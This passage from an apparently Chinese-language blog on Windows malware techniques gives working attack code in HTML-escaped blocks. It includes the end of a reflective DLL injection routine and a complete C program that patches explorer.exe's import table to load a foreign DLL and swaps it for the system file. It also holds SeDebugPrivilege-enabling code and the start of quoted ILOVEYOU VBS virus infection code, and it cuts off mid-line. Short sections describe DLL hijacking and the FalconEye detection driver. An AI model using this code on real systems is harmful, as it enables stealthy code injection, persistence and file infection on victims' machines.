分配的内存地址 +dwReflectiveLoaderOffset  入口点偏移</span><br><span class=\"line\"> </span><br><span class=\"line\">            lpReflectiveLoader = (LPTHREAD_START_ROUTINE)((ULONG_PTR)lpRemoteLibraryBuffer + dwReflectiveLoaderOffset);</span><br><span class=\"line\"> </span><br><span class=\"line\">            // create a remote thread in the host process to call the ReflectiveLoader!</span><br><span class=\"line\">            //OutputDebugString(&quot;INJECTING DLL!&quot;);</span><br><span class=\"line\"> </span><br><span class=\"line\">            //本身反射性dll 就隐蔽性高，自然不可以用createremoteprocess</span><br><span class=\"line\"> </span><br><span class=\"line\">            RtlCreateUserThread = (PRTL_CREATE_USER_THREAD)(GetProcAddress(GetModuleHandle(TEXT(&quot;ntdll&quot;)), &quot;RtlCreateUserThread&quot;));</span><br><span class=\"line\">            RtlCreateUserThread(hProcess, NULL, 0, 0, 0, 0, lpReflectiveLoader, lpParameter, &amp;hThread, NULL); //lpReflectiveLoader 线程函数地址，dll入口函数地址 lpParameter 参数</span><br><span class=\"line\"> </span><br><span class=\"line\"> </span><br><span class=\"line\">            WaitForSingleObject(hThread, INFINITE);</span><br><span class=\"line\"> </span><br><span class=\"line\">            //释放掉为dll映像分配的内存</span><br><span class=\"line\">            VirtualFreeEx(hProcess, lpRemoteLibraryBuffer, dwLength, MEM_RELEASE);</span><br><span class=\"line\"> </span><br><span class=\"line\">        &#125; while (0);</span><br><span class=\"line\"> </span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    __except (EXCEPTION_EXECUTE_HANDLER)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\"> </span><br><span class=\"line\">        hThread = NULL;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"> </span><br><span class=\"line\">    return hThread;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<ul>\n<li>用 FalconEye 实时检测 Windows 进程注入行为</li>\n</ul>\n<ol>\n<li>\n<p>FalconEye 是一款功能强大的 Windows 终端安全检测工具，可以帮助广大研究人员实时检测 Windows 进程注入行为。FalconEye 也是一个内核模式驱动工具，旨在实现实时的进程注入行为。由于 FalconEye 需要以内核模式运行，它可以提供一个强大可靠的安全防御机制来抵御那些尝试绕过各种用户模式钩子的进程注入技术。</p>\n</li>\n<li>\n<p>FalconEye 驱动器是一种按需加载的驱动程序；</p>\n<p>初始化包括通过 libinfinityhook 设置回调和 syscall 钩子；</p>\n<p>回调维护从跨流程活动（如 OpenProcess）构建的 Pids 的映射，但不限于 OpenProcess；</p>\n<p>随后的回调和 syscall 钩子使用这个 Pid 映射来减少处理中的噪声；</p>\n<p>作为降噪的一部分，syscall 钩子可以过滤掉相同的进程活动；</p>\n<p>检测逻辑分为多种子类，即无状态（例如：Atombombing）、有状态（Unmap+Overwrite）和浮动代码（多种技术实现的 Shellcode）；</p>\n<p>针对有状态的检测，syscall 钩子会记录一个 ActionHistory（历史活动），比如说，它会记录所有的 NtWriteVirtualMemory 调用；</p>\n<p>检测逻辑具有常见的异常检测功能，如浮动代码检测和远程进程中 Shellcode 触发器的检测。回调和 syscall 钩子都会调用这个公共功能来进行实际检测；</p>\n</li>\n<li>\n<p>项目来源 https://www.freebuf.com/articles/system/281129.html</p>\n</li>\n</ol>\n<h3 id=\"dll-劫持\"><a class=\"markdownIt-Anchor\" href=\"#dll-劫持\">#</a> DLL 劫持</h3>\n<p>DLL 劫持指的是，病毒通过一些手段来劫持或者替换正常的 DLL，欺骗正常程序加载预先准备好的恶意 DLL。</p>\n<p>如下图，LPK.dll 是应用程序运行所需加载的 DLL，该系统文件默认在 C:\\Windows\\system32 路径下，但由于 windows 优先搜索当前路径，所以当我们把恶意 LPK.dll 放在应用程序同一路径下，便会被程序成功加载，从而执行恶意操作。</p>\n<p>没有对文件名做校验，没有对路径做校验，没有签名</p>\n<p>检测 DLL 劫持漏洞方法：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3NlbnNlcG9zdC9yYXR0bGVyL3JlbGVhc2Vz\">https://github.com/sensepost/rattler/releases</span></p>\n<h3 id=\"输入表感染\"><a class=\"markdownIt-Anchor\" href=\"#输入表感染\">#</a> 输入表感染</h3>\n<p>在 explorer.exe 中添加了 MyDLL.dll 的一个导出函数 MainFun，如果你想先看看效果可以先把附件下下来，把其中的 MyDLL.dll 放入环境变量 path 目录中，例如 system32 目录就可满足你的需要，然后运行 InfectImport.exe, 你会看到一个对话框 “MainFun 成功导入 explorer.exe”，因为我在 dll 被加载时启动了一个线程，然后输出这句话</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br><span class=\"line\">190</span><br><span class=\"line\">191</span><br><span class=\"line\">192</span><br><span class=\"line\">193</span><br><span class=\"line\">194</span><br><span class=\"line\">195</span><br><span class=\"line\">196</span><br><span class=\"line\">197</span><br><span class=\"line\">198</span><br><span class=\"line\">199</span><br><span class=\"line\">200</span><br><span class=\"line\">201</span><br><span class=\"line\">202</span><br><span class=\"line\">203</span><br><span class=\"line\">204</span><br><span class=\"line\">205</span><br><span class=\"line\">206</span><br><span class=\"line\">207</span><br><span class=\"line\">208</span><br><span class=\"line\">209</span><br><span class=\"line\">210</span><br><span class=\"line\">211</span><br><span class=\"line\">212</span><br><span class=\"line\">213</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#include &lt;windows.h&gt;</span><br><span class=\"line\">#include &lt;IMAGEHLP.H&gt;</span><br><span class=\"line\">#include &lt;stdio.h&gt;</span><br><span class=\"line\">#pragma comment(lib,&quot;IMAGEHLP.lib&quot;)</span><br><span class=\"line\"></span><br><span class=\"line\">//用来计算对齐数据后的大小</span><br><span class=\"line\">int alig(int size,unsigned int align)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  if(size%align!=0)</span><br><span class=\"line\">    return (size/align+1)*align;</span><br><span class=\"line\">  else</span><br><span class=\"line\">    return size;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">int main()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  char WinPath[MAX_PATH];</span><br><span class=\"line\">  char FilePath[MAX_PATH];</span><br><span class=\"line\">  char NewPath[MAX_PATH];</span><br><span class=\"line\">  char TemPath[MAX_PATH];</span><br><span class=\"line\">  char LogPath[MAX_PATH];</span><br><span class=\"line\">  FILE* fp;</span><br><span class=\"line\"></span><br><span class=\"line\">  ::GetWindowsDirectory(WinPath,sizeof(WinPath));  //获取windows所在目录</span><br><span class=\"line\">  ::memcpy(FilePath,WinPath,sizeof(WinPath));</span><br><span class=\"line\">  ::memcpy(NewPath,WinPath,sizeof(WinPath));</span><br><span class=\"line\">  ::memcpy(TemPath,WinPath,sizeof(WinPath));</span><br><span class=\"line\">  ::memcpy(LogPath,WinPath,sizeof(WinPath));</span><br><span class=\"line\"></span><br><span class=\"line\">  ::strcat(FilePath,&quot;\\\\explorer.exe&quot;);             //得到原文件路径</span><br><span class=\"line\">  ::strcat(NewPath,&quot;\\\\explorer1.exe&quot;);             //修改文件路径</span><br><span class=\"line\">  ::strcat(TemPath,&quot;\\\\temp.mainst&quot;);               //临时文件路径</span><br><span class=\"line\">  ::strcat(LogPath,&quot;\\\\log.dat&quot;);             //log文件路径，防止修改修改过的explorer.exe</span><br><span class=\"line\"></span><br><span class=\"line\">  //拷贝原始文件，为修改做准备</span><br><span class=\"line\">  ::CopyFile(FilePath,NewPath,false);</span><br><span class=\"line\">  ::CopyFile(FilePath,TemPath,false);</span><br><span class=\"line\"></span><br><span class=\"line\">  fp=::fopen(LogPath,&quot;r&quot;);</span><br><span class=\"line\">  if(fp != NULL)</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    MessageBox(NULL,&quot;explorer.exe已被修改过!&quot;,&quot;提示&quot;,MB_OK);</span><br><span class=\"line\">    return 1;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  //打开需要修改的文件</span><br><span class=\"line\">  fp=::fopen(NewPath,&quot;rb+&quot;);</span><br><span class=\"line\">  if(fp==NULL)</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    ::DeleteFile(NewPath);</span><br><span class=\"line\">    ::DeleteFile(TemPath);</span><br><span class=\"line\">    return 0;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  //往explorer.exe中添加我们准备好的函数</span><br><span class=\"line\">  LOADED_IMAGE img;</span><br><span class=\"line\">  HANDLE hFile;</span><br><span class=\"line\">  PUCHAR lpBaseAddr;</span><br><span class=\"line\">  PIMAGE_NT_HEADERS lpPEhead;</span><br><span class=\"line\">  PIMAGE_IMPORT_DESCRIPTOR lpImport,lpNewImport;</span><br><span class=\"line\">  ULONG ImportSize,NewImportSize;</span><br><span class=\"line\">  PIMAGE_SECTION_HEADER lpFirstSection;</span><br><span class=\"line\">  //保存文件对齐值与区块对齐值</span><br><span class=\"line\">  int SECTION_ALIG;</span><br><span class=\"line\">  int FILE_ALIG;</span><br><span class=\"line\">  int fre=0;</span><br><span class=\"line\">  int i=0;</span><br><span class=\"line\">  int nOldSectionNo;</span><br><span class=\"line\">  DWORD NewSecRVA,NewOffset,ThunkRVA,ImportRVA;</span><br><span class=\"line\">  IMAGE_SECTION_HEADER  NewSection;//要添加的区块</span><br><span class=\"line\">  IMAGE_NT_HEADERS NewNThead;</span><br><span class=\"line\">  memset(&amp;NewSection, 0, sizeof(IMAGE_SECTION_HEADER));</span><br><span class=\"line\">  IMAGE_SECTION_HEADER LastSection;                            //再定义一个区块，来保存原文件最后一个区块的信息</span><br><span class=\"line\"></span><br><span class=\"line\">  //对以下使用的函数如果不太熟悉的，可以看看与PE文件相关的函数</span><br><span class=\"line\">  if(MapAndLoad(&quot;temp.mainst&quot;,WinPath,&amp;img,false,false))       //获得PE文件相关数据</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    hFile=img.hFile;</span><br><span class=\"line\">    lpBaseAddr=img.MappedAddress;</span><br><span class=\"line\">    lpPEhead=img.FileHeader;</span><br><span class=\"line\">    lpImport=(PIMAGE_IMPORT_DESCRIPTOR)ImageDirectoryEntryToData</span><br><span class=\"line\"></span><br><span class=\"line\">      (lpBaseAddr,FALSE,IMAGE_DIRECTORY_ENTRY_IMPORT,&amp;ImportSize);</span><br><span class=\"line\">    ImportSize=lpPEhead-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size;</span><br><span class=\"line\">    nOldSectionNo=lpPEhead-&gt;FileHeader.NumberOfSections;</span><br><span class=\"line\">    SECTION_ALIG=lpPEhead-&gt;OptionalHeader.SectionAlignment;</span><br><span class=\"line\">    FILE_ALIG=lpPEhead-&gt;OptionalHeader.FileAlignment;</span><br><span class=\"line\">    lpFirstSection=img.Sections;</span><br><span class=\"line\">    NewImportSize=ImportSize+sizeof(IMAGE_IMPORT_DESCRIPTOR);</span><br><span class=\"line\">    //获取最后一个节</span><br><span class=\"line\">    memcpy(&amp;LastSection,(PIMAGE_SECTION_HEADER)((DWORD)img.Sections+sizeof(IMAGE_SECTION_HEADER)*(nOldSectionNo-1)),sizeof(IMAGE_SECTION_HEADER));</span><br><span class=\"line\">    //计算新节的RVA</span><br><span class=\"line\">    NewSecRVA=LastSection.VirtualAddress+alig(LastSection.Misc.VirtualSize,SECTION_ALIG);</span><br><span class=\"line\">    //计算新节的文件偏移</span><br><span class=\"line\">    NewOffset=LastSection.PointerToRawData+alig(LastSection.SizeOfRawData,FILE_ALIG);</span><br><span class=\"line\">    //写入DLL名</span><br><span class=\"line\">    fseek(fp,NewOffset,SEEK_SET);</span><br><span class=\"line\">    fre=sizeof(&quot;MyDLL.dll&quot;);</span><br><span class=\"line\">    ::fwrite(&quot;MyDLL.dll&quot;,sizeof(&quot;MyDLL.dll&quot;),1,fp);</span><br><span class=\"line\"></span><br><span class=\"line\">    //准备IMAGE_IMPORT_BY_NAME结构</span><br><span class=\"line\">    IMAGE_IMPORT_BY_NAME ImportFun;</span><br><span class=\"line\">    ImportFun.Hint=0;</span><br><span class=\"line\">    memcpy(ImportFun.Name,&quot;MainFun&quot;,sizeof(&quot;MainFun&quot;));</span><br><span class=\"line\"></span><br><span class=\"line\">    DWORD ThunkData[2];</span><br><span class=\"line\">    ThunkData[0]=NewSecRVA+fre;</span><br><span class=\"line\">    ThunkData[1]=0;</span><br><span class=\"line\"></span><br><span class=\"line\">    //写入IMAGE_IMPORT_BY_NAME结构</span><br><span class=\"line\">    fseek(fp,NewOffset+fre,SEEK_SET);</span><br><span class=\"line\">    fre+=sizeof(&quot;MainFun&quot;)+sizeof(WORD);</span><br><span class=\"line\">    ::fwrite(&amp;ImportFun,sizeof(&quot;MainFun&quot;)+sizeof(WORD),1,fp);</span><br><span class=\"line\"></span><br><span class=\"line\">    fseek(fp,NewOffset+fre,SEEK_SET);</span><br><span class=\"line\">    ThunkRVA=NewSecRVA+fre;</span><br><span class=\"line\">    fre+=sizeof(DWORD)*2;</span><br><span class=\"line\">    ::fwrite(ThunkData,sizeof(DWORD)*2,1,fp);</span><br><span class=\"line\"></span><br><span class=\"line\">    ImportRVA=NewSecRVA+fre;</span><br><span class=\"line\">    //准备新导入表结构，用来写入新文件</span><br><span class=\"line\">    lpNewImport=(PIMAGE_IMPORT_DESCRIPTOR)::malloc(NewImportSize);</span><br><span class=\"line\">    memset(lpNewImport,0,NewImportSize);</span><br><span class=\"line\">    memcpy(lpNewImport,lpImport,ImportSize);</span><br><span class=\"line\"></span><br><span class=\"line\">    //在导入表尾部组织一个新的导入项</span><br><span class=\"line\">    while(1)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      if(lpNewImport[i].OriginalFirstThunk == 0 &amp;&amp; lpNewImport[i].TimeDateStamp == 0 &amp;&amp;</span><br><span class=\"line\">        lpNewImport[i].ForwarderChain == 0 &amp;&amp; lpNewImport[i].Name == 0 &amp;&amp; lpNewImport[i].FirstThunk == 0)</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        lpNewImport[i].Name=NewSecRVA;</span><br><span class=\"line\">        lpNewImport[i].TimeDateStamp=0;</span><br><span class=\"line\">        lpNewImport[i].ForwarderChain=0;</span><br><span class=\"line\">        lpNewImport[i].FirstThunk=ThunkRVA;</span><br><span class=\"line\">        lpNewImport[i].OriginalFirstThunk=ThunkRVA;</span><br><span class=\"line\">        break;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">      else i++;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    fseek(fp,NewOffset+fre,SEEK_SET);</span><br><span class=\"line\">    fre += NewImportSize;</span><br><span class=\"line\">    fwrite(lpNewImport,NewImportSize,1,fp);</span><br><span class=\"line\">    ::free(lpNewImport);</span><br><span class=\"line\"></span><br><span class=\"line\">    //文件对齐</span><br><span class=\"line\">    int num=alig(fre,FILE_ALIG)-fre;</span><br><span class=\"line\">    for(i=0; i&lt;num; i++)</span><br><span class=\"line\">      fputc(&#x27;\\0&#x27;,fp);</span><br><span class=\"line\">    //添加名为.newsec的新节</span><br><span class=\"line\">    strcpy((char*)NewSection.Name,&quot;.newsec&quot;);</span><br><span class=\"line\">    NewSection.VirtualAddress=NewSecRVA;</span><br><span class=\"line\">    NewSection.PointerToRawData=NewOffset;</span><br><span class=\"line\">    NewSection.Misc.VirtualSize=alig(fre,SECTION_ALIG);</span><br><span class=\"line\">    NewSection.SizeOfRawData=alig(fre,FILE_ALIG);</span><br><span class=\"line\">    NewSection.Characteristics=0xC0000040;</span><br><span class=\"line\"></span><br><span class=\"line\">    fseek(fp,((DWORD)lpFirstSection-(DWORD)lpBaseAddr)+sizeof(IMAGE_SECTION_HEADER)*nOldSectionNo,0);</span><br><span class=\"line\"></span><br><span class=\"line\">    //写入新的节表</span><br><span class=\"line\">    fwrite(&amp;NewSection,sizeof(IMAGE_SECTION_HEADER),1,fp);</span><br><span class=\"line\"></span><br><span class=\"line\">    //更新第一块节表属性</span><br><span class=\"line\">    //此处为我困惑的地方，为什么要把第一个节的属性设为0xE0000020</span><br><span class=\"line\">    //这个结论我是从比较loadPE修改过的文件中得出的</span><br><span class=\"line\">    //如果没有此处工作，修改后的文件无法正常运行</span><br><span class=\"line\">    //希望高人能给我解答下</span><br><span class=\"line\">    memcpy(&amp;NewSection,lpFirstSection,sizeof(IMAGE_SECTION_HEADER));</span><br><span class=\"line\">    NewSection.Characteristics=0xE0000020;</span><br><span class=\"line\">    fseek(fp,(DWORD)lpFirstSection-(DWORD)lpBaseAddr,SEEK_SET);</span><br><span class=\"line\">    fwrite(&amp;NewSection,sizeof(IMAGE_SECTION_HEADER),1,fp);</span><br><span class=\"line\"></span><br><span class=\"line\">    memcpy(&amp;NewNThead,lpPEhead,sizeof(IMAGE_NT_HEADERS));</span><br><span class=\"line\">    int nNewImageSize=lpPEhead-&gt;OptionalHeader.SizeOfImage+alig(fre,SECTION_ALIG);</span><br><span class=\"line\">    NewNThead.OptionalHeader.SizeOfImage=nNewImageSize;</span><br><span class=\"line\">    NewNThead.OptionalHeader.DataDirectory[11].Size=0;</span><br><span class=\"line\">    NewNThead.OptionalHeader.DataDirectory[11].VirtualAddress=0;</span><br><span class=\"line\">    NewNThead.OptionalHeader.DataDirectory[12].Size=0;</span><br><span class=\"line\">    NewNThead.OptionalHeader.DataDirectory[12].VirtualAddress=0;</span><br><span class=\"line\">    NewNThead.FileHeader.NumberOfSections=nOldSectionNo+1;</span><br><span class=\"line\">    NewNThead.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress=ImportRVA;</span><br><span class=\"line\">    NewNThead.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size=NewImportSize;</span><br><span class=\"line\">    fseek(fp,(DWORD)(lpPEhead)-(DWORD)lpBaseAddr,SEEK_SET);</span><br><span class=\"line\"></span><br><span class=\"line\">    //写入更新后的PE头</span><br><span class=\"line\">    fwrite(&amp;NewNThead,sizeof(IMAGE_NT_HEADERS),1,fp);</span><br><span class=\"line\">    fclose(fp);</span><br><span class=\"line\">    UnMapAndLoad(&amp;img);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  else</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    ::DeleteFile(NewPath);</span><br><span class=\"line\">    ::DeleteFile(TemPath);</span><br><span class=\"line\">    return 0;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  //删除临时文件</span><br><span class=\"line\">  ::DeleteFile(TemPath);</span><br><span class=\"line\">  //干掉explorer.exe</span><br><span class=\"line\">  ::rename(FilePath,TemPath);</span><br><span class=\"line\">  //让我们修改过后的替换掉explorer.exe</span><br><span class=\"line\">  ::rename(NewPath,FilePath);</span><br><span class=\"line\"></span><br><span class=\"line\">  //创建日志文件，以免重复修改</span><br><span class=\"line\">  fp=::fopen(LogPath,&quot;w&quot;);</span><br><span class=\"line\">  fclose(fp);</span><br><span class=\"line\"></span><br><span class=\"line\">  //重新运行explorer</span><br><span class=\"line\">  ::system(&quot;taskkill /F /im explorer.exe&quot;);</span><br><span class=\"line\">  ::system(&quot;explorer.exe&quot;);</span><br><span class=\"line\">  return 1;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"进程特权\"><a class=\"markdownIt-Anchor\" href=\"#进程特权\">#</a> 进程特权</h3>\n<p>Windows 操作系统中许多操作都需要有对应的特权，特权也是一种非常隐蔽的留后门的方式。在 AD 域中，一些特权在<strong> Default Domain Controller Policy</strong> 组策略中被授予给一些特殊的组，这些组的成员虽然不是域管，但如果被攻击者控制同样能给 AD 域带来巨大的风险</p>\n<p>特权是一个用户或组在本地计算机执行各种系统相关操作（关闭系统、装载设备驱动程序、改变系统时间）的权限，特权与访问权限的区别如下：</p>\n<p>特权控制账户对系统资源和系统相关任务的访问，而访问权限控制对安全对象（可以具有安全描述符的对象）的访问</p>\n<p>系统管理员为用户或组指派特权，而系统根据对象的 DACL 中的 ACE 授予或拒绝对安全对象的访问，有时拥有特权可以忽略 ACL 的检查</p>\n<p>Access Token，其中有一部分表示了该用户及该用户所属组所拥有的特权</p>\n<p>通常我们会使用 <code>whoami /priv</code>  命令查看当前用户所拥有的特权，默认情况下大部分特权是禁用状态，在使用时需要启用</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">BOOL GetDebugPrivilege()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    BOOL status = FALSE;</span><br><span class=\"line\">    HANDLE hToken;</span><br><span class=\"line\"> </span><br><span class=\"line\">    if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &amp;hToken))</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        TOKEN_PRIVILEGES tokenPrivs;</span><br><span class=\"line\">        tokenPrivs.PrivilegeCount = 1;</span><br><span class=\"line\">        if (LookupPrivilegeValueW(NULL, SE_DEBUG_NAME, &amp;tokenPrivs.Privileges[0].Luid))</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            tokenPrivs.Privileges[0].Attributes = TRUE ? SE_PRIVILEGE_ENABLED : 0;</span><br><span class=\"line\">            if (AdjustTokenPrivileges(hToken, FALSE, &amp;tokenPrivs, sizeof(tokenPrivs), NULL, NULL))</span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">                status = TRUE;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        else wprintf(L&quot;[!] LookupPrivilegeValueW error: %u when get debug privilege.\\n&quot;, GetLastError());</span><br><span class=\"line\"> </span><br><span class=\"line\">        CloseHandle(hToken);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    else wprintf(L&quot;[!] OpenProcessToken error: %u when get debug privilege.\\n&quot;, GetLastError());</span><br><span class=\"line\"> </span><br><span class=\"line\">    return status;</span><br><span class=\"line\">&#125; </span><br></pre></td></tr></table></figure>\n<h2 id=\"恶意脚本快速分析\"><a class=\"markdownIt-Anchor\" href=\"#恶意脚本快速分析\">#</a> 恶意脚本快速分析</h2>\n<h3 id=\"vbs脚本病毒\"><a class=\"markdownIt-Anchor\" href=\"#vbs脚本病毒\">#</a> vbs 脚本病毒</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">VBS脚本病毒一般是直接通过自我复制来感染文件的，病毒中的绝大部分代码都可以直接附加在其他同类程序的中间，譬如新欢乐时光病毒可以将自己的代码附加在.htm文件的尾部，并在顶部加入一条调用病毒代码的语句，而爱虫病毒则是直接生成一个文件的副本，将病毒代码拷入其中，并以原文件名作为病毒文件名的前缀，vbs作为后缀。下面我们通过爱虫病毒的部分代码具体分析一下这类病毒的感染和搜索原理：</span><br><span class=\"line\">以下是文件感染的部分关键代码：</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight vbscript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">Set</span> fso=<span class=\"built_in\">createobject</span>(<span class=\"string\">&quot;scripting.filesystemobject&quot;</span>) <span class=\"comment\">&#x27;创建一个文件系统对象</span></span><br><span class=\"line\">　　<span class=\"keyword\">set</span> self=fso.opentextfile(wscript.scriptfullname,<span class=\"number\">1</span>) <span class=\"comment\">&#x27;读打开当前文件（即病毒本身）</span></span><br><span class=\"line\">　　vbscopy=self.readall　　 <span 